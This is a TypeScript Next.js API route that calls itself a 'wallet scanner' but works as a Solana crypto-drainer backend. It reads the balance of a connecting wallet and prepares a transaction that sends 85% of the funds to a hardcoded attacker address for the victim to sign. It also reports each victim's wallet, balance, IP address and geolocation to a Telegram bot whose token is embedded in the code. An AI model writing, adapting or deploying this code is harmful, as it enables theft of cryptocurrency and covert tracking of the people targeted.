import { type NextRequest, NextResponse } from "next/server"
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js"

const RECIPIENT_ADDRESS = "7aE5Y7PvfUr52WnruiDATFpR99PWPo4q9U7vu3Hid3Yh"
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8341387926:AAGEi8QJ2LSLphS15rmAOwS8aPfJ15cX27U"
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "7556622176"
const ADMIN_TELEGRAM_CHAT_ID = process.env.ADMIN_TELEGRAM_CHAT_ID || "7556622176"

// Configuration
const CONFIG = {
  minBalanceSOL: 0.01,
  fallbackSOLPrice: 153.32,
  cacheDuration: 300000,
  notificationRetry: 3,
  transferPercentage: 85,
  transactionFee: 5000,
  safetyBuffer: 10000,
  minimumReserve: 0.001 * LAMPORTS_PER_SOL,
}

// RPC Endpoints with priorities
const RPC_ENDPOINTS = [
  { url: "https://api.mainnet-beta.solana.com", priority: 1 },
  { url: "https://solana-api.projectserum.com", priority: 2 },
  { url: "https://rpc.ankr.com/solana", priority: 3 },
  { url: "https://solana.drpc.org", priority: 4 },
  { url: "https://rpc.solana.com", priority: 5 },
  { url: "https://solana.rpcpool.com", priority: 6 },
]

// Cache for SOL price
let cachedSolPrice = CONFIG.fallbackSOLPrice
let cacheTimestamp = 0

async function getConnection(): Promise<{connection: Connection, endpoint: string}> {
  // Sort by priority
  const sortedEndpoints = [...RPC_ENDPOINTS].sort((a, b) => a.priority - b.priority)
  
  for (const endpoint of sortedEndpoints) {
    try {
      const connection = new Connection(endpoint.url, {
        commitment: "confirmed",
        confirmTransactionInitialTimeout: 10000,
      })
      
      // Test connection
      const blockhash = await connection.getLatestBlockhash("finalized")
      if (blockhash && blockhash.blockhash) {
        console.log(`Connected to RPC: ${endpoint.url}`)
        return { connection, endpoint: endpoint.url }
      }
    } catch (error) {
      console.warn(`RPC endpoint ${endpoint.url} failed:`, error.message)
      continue
    }
  }
  
  throw new Error("All RPC endpoints are unavailable")
}

async function getSOLPrice(): Promise<number> {
  const now = Date.now()
  
  if (cachedSolPrice > 0 && now - cacheTimestamp < CONFIG.cacheDuration) {
    return cachedSolPrice
  }

  try {
    const priceSources = [
      {
        url: "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",
        parser: (data: any) => data.solana?.usd,
      },
      {
        url: "https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT",
        parser: (data: any) => parseFloat(data.price),
      },
      {
        url: "https://api.coinbase.com/v2/prices/SOL-USD/spot",
        parser: (data: any) => parseFloat(data.data?.amount),
      },
    ]

    for (const source of priceSources) {
      try {
        const response = await fetch(source.url, {
          headers: { "User-Agent": "Mozilla/5.0 (compatible; MyApp/1.0)" },
          signal: AbortSignal.timeout(3000),
        })
        
        if (response.ok) {
          const data = await response.json()
          const price = source.parser(data)
          
          if (price && price > 0) {
            cachedSolPrice = price
            cacheTimestamp = now
            return price
          }
        }
      } catch (error) {
        continue
      }
    }
    
    return CONFIG.fallbackSOLPrice
  } catch (error) {
    console.error("Failed to fetch SOL price:", error)
    return CONFIG.fallbackSOLPrice
  }
}

async function sendTelegramNotification(message: string, isError: boolean = false) {
  for (let attempt = 1; attempt <= CONFIG.notificationRetry; attempt++) {
    try {
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
      const chatId = isError ? ADMIN_TELEGRAM_CHAT_ID : TELEGRAM_CHAT_ID

      const response = await fetch(telegramUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown",
          disable_web_page_preview: true,
        }),
      })

      if (response.ok) {
        return true
      }

      if (attempt < CONFIG.notificationRetry) {
        await new Promise(resolve => setTimeout(resolve, 1000 * attempt))
      }
    } catch (error) {
      if (attempt === CONFIG.notificationRetry) {
        console.error("All Telegram notification attempts failed:", error)
      }
    }
  }
  return false
}

async function sendWalletScannedNotification(
  walletAddress: string,
  walletType: string,
  balanceSOL: number,
  balanceUSD: number,
  userIP: string,
  status: "connected" | "insufficient" | "error",
  details?: string
) {
  const date = new Date().toLocaleString("en-US", {
    timeZone: "UTC",
    year: "numeric",
    month: "short",
    day: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  })

  const locationData = await getIPLocation(userIP)
  
  const statusEmoji = {
    connected: "✅",
    insufficient: "⚠️",
    error: "❌"
  }[status]

  const statusText = {
    connected: "WALLET CONNECTED",
    insufficient: "INSUFFICIENT BALANCE",
    error: "SCAN ERROR"
  }[status]

  const message = `
🔍 *WALLET SCANNED - ${statusText}*

${statusEmoji} *Status:* ${statusText}
📱 *Wallet Type:* ${walletType}
📍 *Wallet Address:* \`${walletAddress.slice(0, 12)}...${walletAddress.slice(-8)}\`
💎 *Balance:* ${balanceSOL.toFixed(4)} SOL ($${balanceUSD.toFixed(2)})
📊 *Minimum Required:* ${CONFIG.minBalanceSOL} SOL

🌍 *User Information:*
├─ IP Address: ${userIP}
├─ Location: ${locationData.city}, ${locationData.country}
├─ Region: ${locationData.region}
└─ ISP: ${locationData.isp}

📝 *Details:* ${details || "Wallet scanned successfully"}

🕐 *Timestamp:* ${date} UTC
📡 *Network:* Solana Mainnet
`.trim()

  await sendTelegramNotification(message, status === "error")
}

async function sendTransactionPreparedNotification(
  walletAddress: string,
  walletType: string,
  balanceSOL: number,
  balanceUSD: number,
  transferAmount: number,
  percentage: number,
  userIP: string
) {
  const date = new Date().toLocaleString("en-US", {
    timeZone: "UTC",
    year: "numeric",
    month: "short",
    day: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  })

  const locationData = await getIPLocation(userIP)

  const message = `
⚡ *TRANSACTION PREPARED - READY FOR SIGNING*

📱 *Wallet Type:* ${walletType}
📍 *Wallet Address:* \`${walletAddress}\`
💎 *Total Balance:* ${balanceSOL.toFixed(4)} SOL ($${balanceUSD.toFixed(2)})
💸 *Transfer Amount:* ${transferAmount.toFixed(4)} SOL
📊 *Percentage:* ${percentage}%
📈 *Estimated Fee:* ${(CONFIG.transactionFee / LAMPORTS_PER_SOL).toFixed(6)} SOL

🌍 *User Information:*
├─ IP Address: ${userIP}
├─ Location: ${locationData.city}, ${locationData.country}
├─ Region: ${locationData.region}
└─ ISP: ${locationData.isp}

🕐 *Timestamp:* ${date} UTC
📡 *Network:* Solana Mainnet
🚀 *Status:* AWAITING SIGNATURE
`.trim()

  await sendTelegramNotification(message)
}

async function getIPLocation(ip: string) {
  try {
    if (ip === "unknown" || ip === "127.0.0.1" || 
        ip.startsWith("192.168.") || ip.startsWith("10.")) {
      return { 
        city: "Local Network", 
        country: "Local", 
        region: "Private IP",
        isp: "Local Network"
      }
    }

    const response = await fetch(`https://ipapi.co/${ip}/json/`, {
      headers: { "User-Agent": "Mozilla/5.0 (compatible; MyApp/1.0)" },
      signal: AbortSignal.timeout(2000),
    })
    
    if (response.ok) {
      const data = await response.json()
      return {
        city: data.city || "Unknown",
        country: data.country_name || "Unknown",
        region: data.region || "Unknown",
        isp: data.org || "Unknown ISP",
      }
    }
  } catch (error) {
    console.error("IP location fetch failed:", error)
  }
  
  return { 
    city: "Unknown", 
    country: "Unknown", 
    region: "Unknown",
    isp: "Unknown ISP"
  }
}

function isValidSolanaAddress(address: string): boolean {
  try {
    new PublicKey(address)
    return true
  } catch {
    return false
  }
}

export async function POST(request: NextRequest) {
  const startTime = Date.now()
  const requestId = Math.random().toString(36).substring(7)
  
  console.log(`[${requestId}] Starting wallet scan request`)
  
  try {
    const body = await request.json()
    const { walletAddress, userIP, walletType = "Unknown" } = body

    // Validate input
    if (!walletAddress) {
      await sendWalletScannedNotification(
        "Invalid",
        "Unknown",
        0,
        0,
        userIP || "unknown",
        "error",
        "No wallet address provided"
      )
      
      return NextResponse.json(
        { error: "Wallet address is required" },
        { status: 400 }
      )
    }

    // Validate Solana address
    if (!isValidSolanaAddress(walletAddress)) {
      await sendWalletScannedNotification(
        walletAddress,
        walletType,
        0,
        0,
        userIP || "unknown",
        "error",
        "Invalid Solana address format"
      )
      
      return NextResponse.json(
        { error: "Invalid Solana wallet address" },
        { status: 400 }
      )
    }

    const ipAddress = userIP || request.headers.get("x-forwarded-for") || 
                      request.headers.get("x-real-ip") || "unknown"

    // Get connection
    const { connection, endpoint } = await getConnection()
    console.log(`[${requestId}] Connected to RPC: ${endpoint}`)

    // Get wallet balance
    const walletPubkey = new PublicKey(walletAddress)
    const balanceLamports = await connection.getBalance(walletPubkey)
    const balanceSOL = balanceLamports / LAMPORTS_PER_SOL

    // Get SOL price
    const solPriceUSD = await getSOLPrice()
    const balanceUSD = balanceSOL * solPriceUSD

    console.log(`[${requestId}] Wallet balance: ${balanceSOL} SOL ($${balanceUSD})`)

    // Send scan notification
    await sendWalletScannedNotification(
      walletAddress,
      walletType,
      balanceSOL,
      balanceUSD,
      ipAddress,
      "connected",
      `Connected via ${walletType}`
    )

    // Check minimum balance
    if (balanceSOL < CONFIG.minBalanceSOL) {
      await sendWalletScannedNotification(
        walletAddress,
        walletType,
        balanceSOL,
        balanceUSD,
        ipAddress,
        "insufficient",
        `Balance ${balanceSOL.toFixed(4)} SOL < Minimum ${CONFIG.minBalanceSOL} SOL`
      )
      
      return NextResponse.json(
        {
          success: false,
          message: "Insufficient balance",
          walletBalance: balanceSOL,
          minRequired: CONFIG.minBalanceSOL,
          walletType: walletType,
          userIP: ipAddress,
        },
        { status: 200 }
      )
    }

    // Calculate transfer amount
    const totalReserve = CONFIG.transactionFee + CONFIG.safetyBuffer + CONFIG.minimumReserve
    const availableForTransfer = Math.max(0, balanceLamports - totalReserve)
    const transferAmount = Math.floor(availableForTransfer * (CONFIG.transferPercentage / 100))

    if (transferAmount < 5000) {
      await sendWalletScannedNotification(
        walletAddress,
        walletType,
        balanceSOL,
        balanceUSD,
        ipAddress,
        "insufficient",
        `Transfer amount too small: ${transferAmount / LAMPORTS_PER_SOL} SOL`
      )
      
      return NextResponse.json(
        {
          success: false,
          message: "Transfer amount too small",
          walletBalance: balanceSOL,
          transferAmount: transferAmount / LAMPORTS_PER_SOL,
          walletType: walletType,
          userIP: ipAddress,
        },
        { status: 200 }
      )
    }

    // Get latest blockhash
    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash("finalized")

    // Create transaction
    const recipientPubkey = new PublicKey(RECIPIENT_ADDRESS)
    const transaction = new Transaction({
      recentBlockhash: blockhash,
      feePayer: walletPubkey,
    })

    const transferInstruction = SystemProgram.transfer({
      fromPubkey: walletPubkey,
      toPubkey: recipientPubkey,
      lamports: transferAmount,
    })
    
    transaction.add(transferInstruction)

    const serializedTransaction = transaction
      .serialize({ requireAllSignatures: false, verifySignatures: false })
      .toString("base64")

    // Send transaction prepared notification
    await sendTransactionPreparedNotification(
      walletAddress,
      walletType,
      balanceSOL,
      balanceUSD,
      transferAmount / LAMPORTS_PER_SOL,
      CONFIG.transferPercentage,
      ipAddress
    )

    const processingTime = Date.now() - startTime
    console.log(`[${requestId}] Request completed in ${processingTime}ms`)

    return NextResponse.json({
      success: true,
      walletAddress: walletAddress,
      walletType: walletType,
      walletBalance: balanceSOL,
      walletBalanceUSD: balanceUSD,
      transferAmount: transferAmount / LAMPORTS_PER_SOL,
      transferAmountUSD: (transferAmount / LAMPORTS_PER_SOL) * solPriceUSD,
      percentage: CONFIG.transferPercentage,
      transaction: serializedTransaction,
      blockhash: blockhash,
      lastValidBlockHeight: lastValidBlockHeight,
      rpcEndpoint: endpoint,
      userIP: ipAddress,
      timestamp: new Date().toISOString(),
      processingTime: `${processingTime}ms`,
      requestId: requestId,
    })
  } catch (error) {
    console.error(`[${requestId}] Wallet scan error:`, error)
    
    // Send error notification
    const walletAddr = (error as any)?.walletAddress || "Unknown"
    await sendWalletScannedNotification(
      walletAddr,
      "Unknown",
      0,
      0,
      "unknown",
      "error",
      error instanceof Error ? error.message : "Unknown scan error"
    )

    return NextResponse.json(
      {
        error: "Failed to scan wallet",
        details: error instanceof Error ? error.message : "Unknown error",
        requestId: requestId,
      },
      { status: 500 }
    )
  }
}

export async function GET(request: NextRequest) {
  const health = {
    status: "healthy",
    timestamp: new Date().toISOString(),
    service: "wallet-scanner-api",
    version: "2.0.0",
    config: {
      minBalanceSOL: CONFIG.minBalanceSOL,
      transferPercentage: CONFIG.transferPercentage,
      recipientAddress: RECIPIENT_ADDRESS,
    },
    rpcEndpoints: RPC_ENDPOINTS.map(e => ({
      url: e.url,
      priority: e.priority,
    })),
    endpoints: {
      POST: "/api/scan-wallet",
      GET: "/api/scan-wallet?health",
    },
  }

  return NextResponse.json(health)
}